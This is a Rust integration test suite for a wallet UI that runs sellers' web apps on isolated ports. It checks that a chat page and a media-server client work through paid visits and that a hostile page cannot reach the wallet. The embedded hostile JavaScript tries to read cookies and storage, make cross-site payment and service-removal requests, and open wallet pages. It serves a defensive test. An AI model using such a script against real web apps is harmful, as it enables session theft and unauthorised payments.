//! A seller's own web page, used inside the app (docs/SELLER-APPS.md), in headless Chrome
//! (tests/js/seller_app_test.mjs): the real UI and its app ports, the real connector, and a
//! stand-in signer behind it that asks the seller as the real one does once it is paid. Three
//! stand-in sellers' pages:
//!
//! * a chat page like llama.cpp's server's: its page served only compressed, and an answer streamed
//!   as server-sent events;
//! * a media server's web client like Jellyfin's: a login that sets a cookie and keeps a token in
//!   the page's storage, then a request with its login header;
//! * a hostile page, which tries to read the wallet's cookies and storage, to have the wallet pay
//!   for a stream, to act on the wallet, and to open a wallet page; it reports what it got.
//!
//! Skipped (with a note) when node or Chrome is missing, except under CI. Screenshots: OUT
//! (`$XBT_UI_SNAPSHOT_DIR`, default `target/ui-seller-app`).
#[path = "../../xbt-signer/tests/common/mod.rs"]
mod common;

use std::io::{BufRead, BufReader, Read, Write};
use std::os::unix::net::{UnixListener, UnixStream};
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use common::*;
use serde_json::{json, Value};
use xbt_svc::http::{Reply, Request, Response, Streamed};
use xbt_wallet_ui::app::App;
use xbt_wallet_ui::config::Config;

fn find(cands: &[String]) -> Option<String> {
    cands.iter().find(|c| std::process::Command::new(c).arg("--version").output().is_ok_and(|o| o.status.success())).cloned()
}

const CHAT_PAGE: &str = "<!doctype html><meta charset=\"utf-8\"><title>chat</title><h1>A model's chat page</h1><div id=\"out\"></div><script src=\"./chat.js\"></script>";
const CHAT_JS: &str = r#"(async () => {
  const r = await fetch("./v1/chat/completions", { method: "POST", headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ stream: true, messages: [{ role: "user", content: "hi" }] }) });
  const rd = r.body.getReader(); const dec = new TextDecoder(); let buf = "";
  for (;;) {
    const { value, done } = await rd.read(); if (done) break;
    buf += dec.decode(value, { stream: true }); let i;
    while ((i = buf.indexOf("\n\n")) >= 0) {
      const ev = buf.slice(0, i); buf = buf.slice(i + 2);
      if (ev.startsWith("data: ") && ev.slice(6) !== "[DONE]") {
        const d = JSON.parse(ev.slice(6)); const t = d.choices && d.choices[0] && d.choices[0].delta && d.choices[0].delta.content;
        if (t) document.getElementById("out").textContent += t;
      }
    }
  }
  document.title = "chat-done";
})().catch((e) => { document.title = "chat-failed " + e; });"#;
const JF_PAGE: &str = "<!doctype html><meta charset=\"utf-8\"><title>jf</title><h1>A media server's web client</h1><ul id=\"items\"></ul><script src=\"main.js\"></script>";
const JF_JS: &str = r#"(async () => {
  const a = await fetch("../Users/AuthenticateByName", { method: "POST", headers: { "Content-Type": "application/json", "X-Emby-Authorization": "MediaBrowser Client=\"web\"" },
    body: JSON.stringify({ Username: "guest", Pw: "guest" }) });
  const j = await a.json(); localStorage.setItem("jf_token", j.AccessToken);
  const r = await fetch("../Items", { headers: { "X-Emby-Authorization": "MediaBrowser Token=\"" + j.AccessToken + "\"" } });
  if (!r.ok) throw new Error("items " + r.status);
  for (const it of (await r.json()).Items) { const li = document.createElement("li"); li.textContent = it.Name; document.getElementById("items").appendChild(li); }
  document.title = "jf-done";
})().catch((e) => { document.title = "jf-failed " + e; });"#;
const EVIL_PAGE: &str = "<!doctype html><meta charset=\"utf-8\"><title>evil</title><p>Nothing to see.</p><script src=\"./evil.js\"></script>";
const EVIL_JS: &str = r#"(async () => {
  const w = new URLSearchParams(location.search).get("w");
  const rep = { cookie: document.cookie, storage: Object.keys(localStorage) };
  try { rep.parent = window.parent.document.title; } catch (e) { rep.parent = "blocked"; }
  try { rep.parentStorage = window.parent.localStorage.length; } catch (e) { rep.parentStorage = "blocked"; }
  try { await fetch(w + "/s/https://seller.invalid/evil-film", { mode: "no-cors", credentials: "include" }); } catch (e) { /* refused */ }
  try { await fetch(w + "/services", { method: "POST", mode: "no-cors", credentials: "include", headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: "action=remove&url=" + encodeURIComponent(location.origin) }); } catch (e) { /* refused */ }
  try { const r = await fetch(w + "/api/visit?v=00", { credentials: "include" }); rep.readWallet = await r.text(); } catch (e) { rep.readWallet = "blocked"; }
  try { rep.popup = String(!!window.open(w + "/sell")); } catch (e) { rep.popup = "blocked"; }
  const v = document.createElement("video"); v.src = w + "/s/https://seller.invalid/evil-video"; document.body.appendChild(v);
  await new Promise((r) => setTimeout(r, 500));
  await fetch("./report", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(rep) });
  document.title = "evil-done";
})().catch((e) => { document.title = "evil-failed " + e; });"#;

/// The stand-in sellers' service: the three pages, and what the hostile one reported.
struct Seller {
    report: Arc<Mutex<Option<Value>>>,
}

impl xbt_svc::http::Handler for Seller {
    fn body_limit(&self, _m: &str, _t: &str) -> usize {
        1 << 16
    }

    fn handle(&self, _r: Request) -> Response {
        Response::text(500, "text/plain", "unused")
    }

    fn reply(&self, req: Request) -> Reply {
        let path = req.path().to_string();
        let ok = |t: &str, b: &str| Reply::Whole(Response::new(200, vec![("Content-Type".into(), t.into())], b.as_bytes().to_vec()));
        // the media server's live connection: an echo, as a WebSocket
        if path == "/jf/socket" && req.header("Upgrade").is_some_and(|u| u.eq_ignore_ascii_case("websocket")) {
            let key = req.header("Sec-WebSocket-Key").unwrap_or("").to_string();
            return Reply::Upgrade(xbt_svc::http::Upgraded {
                headers: vec![("Upgrade".into(), "websocket".into()), ("Sec-WebSocket-Accept".into(), format!("accept-{key}"))],
                run: Box::new(|mut s, early| {
                    if !early.is_empty() && s.write_all(&early).is_err() {
                        return;
                    }
                    let mut buf = [0u8; 4096];
                    while let Ok(n) = s.read(&mut buf) {
                        if n == 0 || s.write_all(&buf[..n]).is_err() {
                            break;
                        }
                    }
                }),
            });
        }
        match (req.method.as_str(), path.as_str()) {
            // as llama.cpp's server: the page only compressed
            ("GET", "/app/") => {
                if !req.header("Accept-Encoding").is_some_and(|a| a.contains("gzip")) {
                    return Reply::Whole(Response::text(415, "text/plain", "Error: gzip is not supported by this browser"));
                }
                let mut z = flate2::write::GzEncoder::new(vec![], flate2::Compression::default());
                z.write_all(CHAT_PAGE.as_bytes()).unwrap();
                Reply::Whole(Response::new(200, vec![("Content-Type".into(), "text/html; charset=utf-8".into()), ("Content-Encoding".into(), "gzip".into())],
                                           z.finish().unwrap()))
            }
            ("GET", "/app/chat.js") => ok("text/javascript", CHAT_JS),
            ("POST", "/app/v1/chat/completions") => Reply::Stream(Streamed { status: 200, headers: vec![("Content-Type".into(), "text/event-stream".into())], length: None,
                body: Box::new(|out| {
                    for t in ["Hello", " from", " the", " model"] {
                        out.send(format!("data: {}\n\n", json!({"choices": [{"delta": {"content": t}}]})).as_bytes())?;
                        std::thread::sleep(Duration::from_millis(60));
                    }
                    out.send(b"data: [DONE]\n\n")
                }) }),
            ("GET", "/jf/web/") => ok("text/html; charset=utf-8", JF_PAGE),
            ("GET", "/jf/web/main.js") => ok("text/javascript", JF_JS),
            ("POST", "/jf/Users/AuthenticateByName") => Reply::Whole(Response::new(200, vec![("Content-Type".into(), "application/json".into()),
                ("Set-Cookie".into(), "jfsess=s1; Path=/; HttpOnly; Secure; SameSite=None; Domain=seller.invalid".into())], json!({"AccessToken": "tok-123"}).to_string().into_bytes())),
            ("GET", "/jf/Items") => {
                let login = req.header("X-Emby-Authorization").is_some_and(|a| a.contains("tok-123"));
                let cookie = req.header("Cookie").is_some_and(|c| c.split(';').any(|x| x.trim() == "jfsess=s1"));
                if !(login && cookie) {
                    return Reply::Whole(Response::text(401, "text/plain", format!("login {login} cookie {cookie}")));
                }
                Reply::Whole(Response::new(200, vec![("Content-Type".into(), "application/json".into())],
                                           json!({"Items": [{"Name": "Big Buck Bunny"}, {"Name": "Sintel"}]}).to_string().into_bytes()))
            }
            // the same seller's second app: a podcast player, with a cookie of its own, that says which cookies reached it
            ("GET", "/pod/") => Reply::Whole(Response::new(200, vec![("Content-Type".into(), "text/html; charset=utf-8".into()),
                ("Set-Cookie".into(), "podsess=p1; Path=/".into())], b"<!doctype html><title>pod</title><h1>Podcasts</h1>".to_vec())),
            ("GET", "/pod/me") => ok("application/json", &json!({"cookie": req.header("Cookie").unwrap_or("")}).to_string()),
            // the shop's routes: the media server gives each buyer an account, the podcast player does not
            ("GET", "/services") => ok("application/json", &json!({"routes": [{"path": "/jf/", "accounts": true}, {"path": "/pod/"}]}).to_string()),
            ("GET", "/evil/") => ok("text/html; charset=utf-8", EVIL_PAGE),
            ("GET", "/evil/evil.js") => ok("text/javascript", EVIL_JS),
            ("POST", "/evil/report") => {
                *self.report.lock().unwrap() = serde_json::from_slice(&req.body).ok();
                ok("application/json", "{}")
            }
            _ => Reply::Whole(Response::text(404, "text/plain", "no such page")),
        }
    }
}

/// A stand-in signer for the connector: each `xbt402_pay` asked of the seller as the real signer
/// asks once it has paid (the method, the caller's headers and body, the seller's head and body
/// back, the head line first), and every URL it was asked for, kept.
/// The sessions the fake signer was asked to stop.
static STOPPED: Mutex<Vec<String>> = Mutex::new(Vec::new());

fn signer(dir: &Path) -> (PathBuf, Arc<Mutex<Vec<String>>>) {
    let sock = dir.join("pay.sock");
    let l = UnixListener::bind(&sock).unwrap();
    let streams = dir.to_path_buf();
    let urls = Arc::new(Mutex::new(vec![]));
    let u2 = urls.clone();
    std::thread::spawn(move || {
        for conn in l.incoming() {
            let mut conn = conn.unwrap();
            let (streams, urls) = (streams.clone(), u2.clone());
            std::thread::spawn(move || {
                let mut line = String::new();
                BufReader::new(conn.try_clone().unwrap()).read_line(&mut line).unwrap();
                let req: Value = serde_json::from_str(&line).unwrap();
                // the connection the visits paid through: one open session with the seller last paid, until it is stopped
                if req["method"] == "ticket_status" {
                    let origin: String = urls.lock().unwrap().last().map(|u: &String| u.split('/').take(3).collect::<Vec<&str>>().join("/")).unwrap_or_default();
                    let id = format!("s-{}", origin.len());
                    let state = if STOPPED.lock().unwrap().contains(&id) { "closed" } else { "open" };
                    let _ = writeln!(conn, "{}", json!({"id": 1, "result": {"sessions": [{"session": id, "origin": origin, "state": state}], "paying": []}}));
                    return;
                }
                if req["method"] == "ticket_stop" {
                    STOPPED.lock().unwrap().push(req["params"]["session"].as_str().unwrap_or("").to_string());
                    let _ = writeln!(conn, "{}", json!({"id": 1, "result": {"ok": true}}));
                    return;
                }
                if req["method"] != "xbt402_pay" {
                    let _ = writeln!(conn, "{}", json!({"id": 1, "result": {"ready": true}}));
                    return;
                }
                let p = &req["params"];
                let url = p["url"].as_str().unwrap().to_string();
                urls.lock().unwrap().push(url.clone());
                if p["upgrade"] == true {
                    // a WebSocket, asked of the seller as one, joined to the stream socket both ways
                    let rest = url.strip_prefix("http://").unwrap();
                    let (host, path) = rest.split_once('/').map(|(h, p)| (h, format!("/{p}"))).unwrap();
                    let mut up = std::net::TcpStream::connect(host).unwrap();
                    let mut head = format!("GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: Upgrade\r\nUpgrade: websocket\r\n");
                    for h in p["headers"].as_array().into_iter().flatten() {
                        head.push_str(&format!("{}: {}\r\n", h[0].as_str().unwrap(), h[1].as_str().unwrap()));
                    }
                    up.write_all(format!("{head}\r\n").as_bytes()).unwrap();
                    let mut rd = BufReader::new(up.try_clone().unwrap());
                    let mut status_line = String::new();
                    rd.read_line(&mut status_line).unwrap();
                    let mut headers = vec![];
                    loop {
                        let mut l = String::new();
                        rd.read_line(&mut l).unwrap();
                        if l.trim().is_empty() {
                            break;
                        }
                        if let Some((k, v)) = l.split_once(':') {
                            headers.push(json!([k.trim(), v.trim()]));
                        }
                    }
                    let status: u64 = status_line.split(' ').nth(1).unwrap().parse().unwrap();
                    let out = UnixStream::connect(streams.join(p["stream_to"].as_str().unwrap())).unwrap();
                    let _ = writeln!(&out, "{}", json!({"status": status, "headers": headers}));
                    let (mut o1, mut o2, mut u1) = (out.try_clone().unwrap(), out, up);
                    let t = std::thread::spawn(move || {
                        let _ = std::io::copy(&mut o1, &mut u1);
                        let _ = u1.shutdown(std::net::Shutdown::Both);
                    });
                    let _ = std::io::copy(&mut rd, &mut o2);
                    let _ = o2.shutdown(std::net::Shutdown::Both);
                    let _ = t.join();
                    let _ = writeln!(conn, "{}", json!({"id": 1, "result": {"verdict": "allow", "status": status, "charged_sats": 0, "complete": true}}));
                    return;
                }
                let agent = ureq::AgentBuilder::new().redirects(0).build();
                let mut r = agent.request(p["method"].as_str().unwrap_or("GET"), &url);
                for h in p["headers"].as_array().into_iter().flatten() {
                    r = r.set(h[0].as_str().unwrap(), h[1].as_str().unwrap());
                }
                use base64::Engine as _;
                let body = p["body_b64"].as_str().map(|b| base64::engine::general_purpose::STANDARD.decode(b).unwrap()).unwrap_or_default();
                let resp = match if body.is_empty() { r.call() } else { r.send_bytes(&body) } {
                    Ok(x) | Err(ureq::Error::Status(_, x)) => x,
                    Err(e) => {
                        let _ = writeln!(conn, "{}", json!({"id": 1, "result": {"verdict": "deny", "rule": "xbt402", "reason": e.to_string()}}));
                        return;
                    }
                };
                let mut headers = vec![];
                for n in resp.headers_names() {
                    if !["content-length", "transfer-encoding", "connection"].contains(&n.to_ascii_lowercase().as_str()) {
                        for v in resp.all(&n) {
                            headers.push(json!([n, v]));
                        }
                    }
                }
                let head = json!({"status": resp.status(), "content_type": resp.header("content-type"), "headers": headers});
                let mut out = UnixStream::connect(streams.join(p["stream_to"].as_str().unwrap())).unwrap();
                let _ = writeln!(out, "{head}");
                let mut src = resp.into_reader();
                let mut buf = [0u8; 8192];
                while let Ok(n) = src.read(&mut buf) {
                    if n == 0 || out.write_all(&buf[..n]).is_err() {
                        break;
                    }
                }
                drop(out);
                let _ = writeln!(conn, "{}", json!({"id": 1, "result": {"verdict": "allow", "status": 200, "charged_sats": 0, "complete": true}}));
            });
        }
    });
    (sock, urls)
}

fn free_port() -> u16 {
    std::net::TcpListener::bind("127.0.0.1:0").unwrap().local_addr().unwrap().port()
}

/// The UI with `n` app ports, picked free just before it binds them: tried again on fresh ports
/// when another test took one in between.
fn spawn_ui(n: usize, make: impl Fn(Vec<u16>) -> Config) -> (xbt_wallet_ui::server::Running, Vec<u16>) {
    // a port taken in between fails the start, so it can be tried again (the caller holds ENV)
    std::env::set_var("XBT_UI_APP_PORTS_STRICT", "1");
    for _ in 0..8 {
        let ports: Vec<u16> = (0..n).map(|_| free_port()).collect();
        if let Ok(srv) = xbt_wallet_ui::server::spawn(App::new(make(ports.clone())).unwrap()) {
            return (srv, ports);
        }
    }
    panic!("no free ports for the app");
}

#[test]
fn a_sellers_own_page_works_inside_the_app_and_cannot_reach_the_wallet() {
    let home = std::env::var("HOME").unwrap_or_default();
    let (Some(node), Some(chrome)) = (find(&["node".into(), format!("{home}/.local/share/nodejs/bin/node")]),
                                      find(&[std::env::var("CHROME").unwrap_or_else(|_| "google-chrome".into()), "chromium".into(), "chromium-browser".into()])) else {
        assert!(std::env::var_os("CI").is_none(), "node or chrome not found, and CI must have both (CHROME={:?})", std::env::var("CHROME"));
        return eprintln!("node or chrome not found: skipped");
    };
    let _e = ENV.lock().unwrap_or_else(|p| p.into_inner());
    // the sellers
    let report = Arc::new(Mutex::new(None));
    let sl = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let seller = format!("http://{}", sl.local_addr().unwrap());
    let srun = xbt_svc::http::serve(Arc::new(Seller { report: report.clone() }), sl, 16).unwrap();
    // the connector, paying through the stand-in signer
    let dir = tempfile::tempdir().unwrap();
    let (pay_sock, paid_urls) = signer(dir.path());
    let cl = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let crun = lightning_stream::serve(lightning_stream::Config { signer: pay_sock, stream_dir: dir.path().to_path_buf(), task: "app".into(), max_sats: 2_000 }, cl).unwrap();
    // the UI, with its own (real) signer for its pages
    let rig = Rig::new(json!({"human_pubkey": ""}), true);
    let sock_path = rig.dir.path().join("signer.sock");
    let _sock = xbt_signer::server::spawn(rig.s.clone(), &sock_path, false).unwrap();
    let data = tempfile::tempdir().unwrap();
    let ui_port = free_port();
    let make = |ports: Vec<u16>| {
        let mut cfg = Config::for_test(sock_path.clone(), data.path().join("ui"), &format!("127.0.0.1:{ui_port}"));
        cfg.connector = format!("http://{}", crun.addr);
        cfg.app_ports = ports;
        cfg
    };
    let wallet = format!("http://127.0.0.1:{ui_port}");
    std::fs::create_dir_all(data.path().join("ui")).unwrap();
    let services = json!([
        {"name": "A model", "kind": "ai", "seller": seller, "price_text": "10 sat per 1,000 tokens", "items": [],
         "app": format!("{seller}/app/"), "app_base": format!("{seller}/app/")},
        {"name": "Films", "kind": "video", "seller": seller, "price_text": "20 sat a MiB", "items": [],
         "app": format!("{seller}/jf/web/"), "app_base": format!("{seller}/jf/")},
        {"name": "A game", "kind": "api", "seller": seller, "price_text": "1 sat a request", "items": [],
         "app": format!("{seller}/evil/?w={wallet}"), "app_base": format!("{seller}/evil/")}
    ]);
    std::fs::write(data.path().join("ui/services.json"), services.to_string()).unwrap();
    let services_before = std::fs::read_to_string(data.path().join("ui/services.json")).unwrap();
    let (srv, _) = spawn_ui(2, make);
    assert_eq!(srv.app_ports.len(), 2);
    let policy_before = rig.call("policy_get", json!({}))["sha256"].clone();
    let code = std::fs::read_to_string(data.path().join("ui/setup-code")).unwrap();
    let out = std::env::var("XBT_UI_SNAPSHOT_DIR").unwrap_or_else(|_| concat!(env!("CARGO_MANIFEST_DIR"), "/../../target/ui-seller-app").into());
    let enc = |s: &str| xbt_wallet_ui::services::urlenc(s);
    let opens = json!({
        "chat": format!("/app?u={}&b={}", enc(&format!("{seller}/app/")), enc(&format!("{seller}/app/"))),
        "jf": format!("/app?u={}&b={}", enc(&format!("{seller}/jf/web/")), enc(&format!("{seller}/jf/"))),
        "evil": format!("/app?u={}&b={}", enc(&format!("{seller}/evil/?w={wallet}")), enc(&format!("{seller}/evil/"))),
    });
    let o = std::process::Command::new(node).env("CHROME", chrome)
        .args([concat!(env!("CARGO_MANIFEST_DIR"), "/tests/js/seller_app_test.mjs"), &wallet, code.trim(), &out, &opens.to_string()])
        .output().unwrap();
    let text = String::from_utf8_lossy(&o.stdout);
    eprintln!("{text}");
    assert!(o.status.success(), "{text}{}", String::from_utf8_lossy(&o.stderr));
    // what the hostile page got: none of the wallet's cookies or storage, nothing of the wallet's answers
    let rep = report.lock().unwrap().clone().expect("the hostile page reported");
    let cookie = rep["cookie"].as_str().unwrap_or("");
    assert!(!cookie.contains("xbt_ui") && !cookie.contains("__ls_visit"), "the page read a wallet cookie: {rep}");
    assert!(rep["storage"].as_array().is_some_and(|a| !a.iter().any(|k| k.as_str().unwrap_or("").starts_with("xbt-wallet"))), "{rep}");
    assert_eq!((rep["parent"].as_str(), rep["parentStorage"].as_str()), (Some("blocked"), Some("blocked")), "{rep}");
    assert!(!rep["readWallet"].as_str().unwrap_or("").contains("ended"), "the page read a wallet answer: {rep}");
    // no stream was paid at its word, and nothing on the wallet changed
    let urls = paid_urls.lock().unwrap().clone();
    assert!(!urls.iter().any(|u| u.contains("evil-film") || u.contains("evil-video")), "the wallet paid at the hostile page's word: {urls:?}");
    assert!(urls.iter().all(|u| u.starts_with(&seller)), "{urls:?}");
    assert_eq!(std::fs::read_to_string(data.path().join("ui/services.json")).unwrap(), services_before, "the hostile page changed the wallet's sellers");
    assert_eq!(rig.call("policy_get", json!({}))["sha256"], policy_before);
    drop(srun);
}

/// The app port without a browser: it serves nothing without its visit's cookie; the one-time code
/// is good once and on its own port only; the cookie works on that port alone; the wallet's
/// cookies never reach the seller; a stopped visit pays nothing more.
#[test]
fn an_app_port_serves_only_the_visit_whose_cookie_it_gave() {
    let _e = ENV.lock().unwrap_or_else(|p| p.into_inner());
    let sl = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let seller = format!("http://{}", sl.local_addr().unwrap());
    let _srun = xbt_svc::http::serve(Arc::new(Seller { report: Arc::new(Mutex::new(None)) }), sl, 8).unwrap();
    let dir = tempfile::tempdir().unwrap();
    let (pay_sock, paid_urls) = signer(dir.path());
    let crun = lightning_stream::serve(lightning_stream::Config { signer: pay_sock, stream_dir: dir.path().to_path_buf(), task: "app".into(), max_sats: 2_000 },
                                       std::net::TcpListener::bind("127.0.0.1:0").unwrap()).unwrap();
    let rig = Rig::new(json!({}), true);
    let sock_path = rig.dir.path().join("signer.sock");
    let _sock = xbt_signer::server::spawn(rig.s.clone(), &sock_path, false).unwrap();
    let data = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(data.path().join("ui")).unwrap();
    let base = format!("{seller}/jf/");
    std::fs::write(data.path().join("ui/services.json"), json!([{"name": "Films", "kind": "video", "seller": seller, "price_text": "20 sat a MiB", "items": [],
        "app": format!("{seller}/jf/web/"), "app_base": base}]).to_string()).unwrap();
    let (srv, ports) = spawn_ui(2, |ports| {
        let mut cfg = Config::for_test(sock_path.clone(), data.path().join("ui"), "127.0.0.1:0");
        cfg.connector = format!("http://{}", crun.addr);
        cfg.app_ports = ports;
        cfg
    });
    let (pa, pb) = (ports[0], ports[1]);
    let wallet = format!("http://{}", srv.addr);
    let agent = ureq::AgentBuilder::new().redirects(0).build();
    let send = |method: &str, url: &str, cookie: &str, body: Option<&str>| -> (u16, Vec<(String, String)>, String) {
        let mut r = agent.request(method, url);
        if !cookie.is_empty() {
            r = r.set("Cookie", cookie);
        }
        let resp = match match body { Some(b) => r.set("Content-Type", "application/x-www-form-urlencoded").send_string(b), None => r.call() } {
            Ok(x) | Err(ureq::Error::Status(_, x)) => x,
            Err(e) => panic!("{url}: {e}"),
        };
        let headers = resp.headers_names().iter().flat_map(|n| resp.all(n).into_iter().map(|v| (n.to_ascii_lowercase(), v.to_string())).collect::<Vec<_>>()).collect();
        (resp.status(), headers, resp.into_string().unwrap_or_default())
    };
    let cookie_of = |h: &[(String, String)], name: &str| h.iter().filter(|(k, _)| k == "set-cookie").find_map(|(_, v)| v.split(';').next().filter(|c| c.starts_with(name)).map(str::to_string));
    // the owner's session
    let code = std::fs::read_to_string(data.path().join("ui/setup-code")).unwrap();
    let (st, h, _) = send("POST", &format!("{wallet}/setup-password"), "", Some(&format!("code={}&password=a+long+box+password&password2=a+long+box+password", code.trim())));
    assert_eq!(st, 303);
    let session = cookie_of(&h, "xbt").expect("a session cookie");
    let field = |page: &str, attr: &str| { let i = page.find(&format!("{attr}=\"")).unwrap() + attr.len() + 2; page[i..i + page[i..].find('"').unwrap()].to_string() };
    let enc = xbt_wallet_ui::services::urlenc;
    let (_, _, page) = send("GET", &format!("{wallet}/app?u={}&b={}", enc(&format!("{seller}/jf/web/")), enc(&base)), &session, None);
    let csrf = { let i = page.find("name=\"csrf\" value=\"").unwrap() + 19; page[i..i + page[i..].find('"').unwrap()].to_string() };
    let (st, _, page) = send("POST", &format!("{wallet}/app"), &session,
                             Some(&format!("csrf={csrf}&u={}&b={}&limit=900", enc(&format!("{seller}/jf/web/")), enc(&base))));
    assert_eq!(st, 200, "{page}");
    let (visit, port, code) = (field(&page, "data-visit"), field(&page, "data-port").parse::<u16>().unwrap(), field(&page, "data-code"));
    let other = if port == pa { pb } else { pa };
    // nothing without the cookie, and the code is good on its own port only, once
    assert_eq!(send("GET", &format!("http://127.0.0.1:{port}/web/"), &session, None).0, 403);
    assert_eq!(send("GET", &format!("http://127.0.0.1:{other}/__ls/enter?c={code}"), "", None).0, 403);
    let (st, h, _) = send("GET", &format!("http://127.0.0.1:{port}/__ls/enter?c={code}"), "", None);
    assert_eq!((st, h.iter().find(|(k, _)| k == "location").map(|(_, v)| v.as_str())), (302, Some("/web/")));
    let visit_cookie = cookie_of(&h, "__ls_visit_").expect("the port's cookie");
    assert!(h.iter().any(|(k, v)| k == "set-cookie" && v.contains("HttpOnly") && v.contains("SameSite=Strict")));
    assert_eq!(send("GET", &format!("http://127.0.0.1:{port}/__ls/enter?c={code}"), "", None).0, 403, "a code is good once");
    // with it: the page, through the visit; the wallet's cookie is not passed on
    let both = format!("{session}; {visit_cookie}");
    let (st, _, body) = send("GET", &format!("http://127.0.0.1:{port}/web/"), &both, None);
    assert!(st == 200 && body.contains("media server"), "{st} {body}");
    assert_eq!(send("GET", &format!("http://127.0.0.1:{other}/web/"), &both, None).0, 403, "a port's cookie is no good on another port");
    // the seller's cookie comes back under the port's prefix, made plain http, and goes back to the seller as it set it
    let (st, h, _) = send("POST", &format!("http://127.0.0.1:{port}/Users/AuthenticateByName"), &both, Some("{}"));
    assert_eq!(st, 200);
    let sc = h.iter().find(|(k, _)| k == "set-cookie").map(|(_, v)| v.clone()).unwrap();
    assert!(sc.starts_with(&format!("lsa{port}_")) && sc.contains("jfsess=s1") && !sc.contains("Secure") && !sc.contains("Domain"), "{sc}");
    let jar = format!("{both}; {}", sc.split(';').next().unwrap());
    let r = agent.get(&format!("http://127.0.0.1:{port}/Items")).set("Cookie", &jar).set("X-Emby-Authorization", "MediaBrowser Token=\"tok-123\"").call();
    assert_eq!(r.map(|x| x.status()).unwrap_or_else(|e| match e { ureq::Error::Status(c, _) => c, _ => 0 }), 200, "the seller got its cookie back, and its login header");
    // the page's live connection: a WebSocket through the port, the visit and the wallet, both ways
    {
        let mut ws = std::net::TcpStream::connect(("127.0.0.1", port)).unwrap();
        ws.set_read_timeout(Some(Duration::from_secs(10))).unwrap();
        write!(ws, "GET /socket HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\nCookie: {both}\r\nConnection: Upgrade\r\nUpgrade: websocket\r\n\
                    Sec-WebSocket-Key: k9\r\nSec-WebSocket-Version: 13\r\n\r\n").unwrap();
        let mut rd = BufReader::new(ws.try_clone().unwrap());
        let mut head = String::new();
        loop {
            let mut l = String::new();
            rd.read_line(&mut l).unwrap();
            head.push_str(&l);
            if l == "\r\n" {
                break;
            }
        }
        assert!(head.starts_with("HTTP/1.1 101") && head.contains("accept-k9"), "{head}");
        ws.write_all(b"hello over the socket").unwrap();
        let mut back = [0u8; 21];
        rd.read_exact(&mut back).unwrap();
        assert_eq!(&back, b"hello over the socket");
    }
    assert!(paid_urls.lock().unwrap().iter().all(|u| u.starts_with(&base)), "only the page's own base was asked for");
    // Stop: the next request pays nothing, and says so
    let calls = paid_urls.lock().unwrap().len();
    let (st, _, _) = send("POST", &format!("{wallet}/app-stop"), &session, Some(&format!("csrf={csrf}&visit={visit}")));
    assert_eq!(st, 303);
    // one Stop ends it all: the connection the visit paid through is stopped too (0.2.2 left it "Open, idle")
    let sid = format!("s-{}", base.split('/').take(3).collect::<Vec<_>>().join("/").len());
    assert!(STOPPED.lock().unwrap().contains(&sid), "the shop's connection is stopped with the visit: {:?}", STOPPED.lock().unwrap());
    let (st, _, _) = send("GET", &format!("http://127.0.0.1:{port}/web/"), &both, None);
    assert_eq!(st, 403, "the stopped visit's cookie is gone");
    assert_eq!(paid_urls.lock().unwrap().len(), calls);
}

/// The owner's own shop: its page is previewed free, straight from the service on the box through
/// the same app port; nothing goes to the connector, so nothing is paid.
#[test]
fn the_owner_previews_their_own_shops_page_for_free() {
    let _e = ENV.lock().unwrap_or_else(|p| p.into_inner());
    let sl = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let service = format!("http://{}", sl.local_addr().unwrap());
    let _srun = xbt_svc::http::serve(Arc::new(Seller { report: Arc::new(Mutex::new(None)) }), sl, 8).unwrap();
    let dir = tempfile::tempdir().unwrap();
    let (pay_sock, paid_urls) = signer(dir.path());
    let crun = lightning_stream::serve(lightning_stream::Config { signer: pay_sock, stream_dir: dir.path().to_path_buf(), task: "app".into(), max_sats: 2_000 },
                                       std::net::TcpListener::bind("127.0.0.1:0").unwrap()).unwrap();
    let rig = Rig::new(json!({}), true);
    let sock_path = rig.dir.path().join("signer.sock");
    let _sock = xbt_signer::server::spawn(rig.s.clone(), &sock_path, false).unwrap();
    let data = tempfile::tempdir().unwrap();
    let gw = tempfile::tempdir().unwrap();
    // this box's own shop sells the media server's page under /jf/, from the service on the box
    std::fs::write(gw.path().join("config.json"), json!({"public_url": "https://shop.example",
        "routes": [{"path": "/jf/", "upstream": service, "price": {"byte_msat": 20000, "per_bytes": 1048576}}]}).to_string()).unwrap();
    std::fs::create_dir_all(data.path().join("ui")).unwrap();
    std::fs::write(data.path().join("ui/services.json"), json!([{"name": "Films", "kind": "video", "seller": "https://shop.example", "price_text": "20 sat a MiB",
        "items": [], "app": "https://shop.example/jf/web/", "app_base": "https://shop.example/jf/"}]).to_string()).unwrap();
    let (srv, ports) = spawn_ui(1, |ports| {
        let mut cfg = Config::for_test(sock_path.clone(), data.path().join("ui"), "127.0.0.1:0");
        cfg.connector = format!("http://{}", crun.addr);
        cfg.sell = true;
        cfg.gw.dir = gw.path().to_path_buf();
        cfg.app_ports = ports;
        cfg
    });
    let port = ports[0];
    let wallet = format!("http://{}", srv.addr);
    let agent = ureq::AgentBuilder::new().redirects(0).build();
    let code = std::fs::read_to_string(data.path().join("ui/setup-code")).unwrap();
    let r = agent.post(&format!("{wallet}/setup-password")).set("Content-Type", "application/x-www-form-urlencoded")
        .send_string(&format!("code={}&password=a+long+box+password&password2=a+long+box+password", code.trim()));
    let r = match r { Ok(x) | Err(ureq::Error::Status(_, x)) => x, Err(e) => panic!("{e}") };
    let session = r.header("set-cookie").unwrap().split(';').next().unwrap().to_string();
    let enc = xbt_wallet_ui::services::urlenc;
    let q = format!("u={}&b={}", enc("https://shop.example/jf/web/"), enc("https://shop.example/jf/"));
    let page = agent.get(&format!("{wallet}/app?{q}")).set("Cookie", &session).call().unwrap().into_string().unwrap();
    assert!(page.contains("Preview the app (free)") && !page.contains("Spend at most"), "{page}");
    let csrf = { let i = page.find("name=\"csrf\" value=\"").unwrap() + 19; page[i..i + page[i..].find('"').unwrap()].to_string() };
    let page = agent.post(&format!("{wallet}/app")).set("Cookie", &session).set("Content-Type", "application/x-www-form-urlencoded")
        .send_string(&format!("csrf={csrf}&{q}&preview=1")).unwrap().into_string().unwrap();
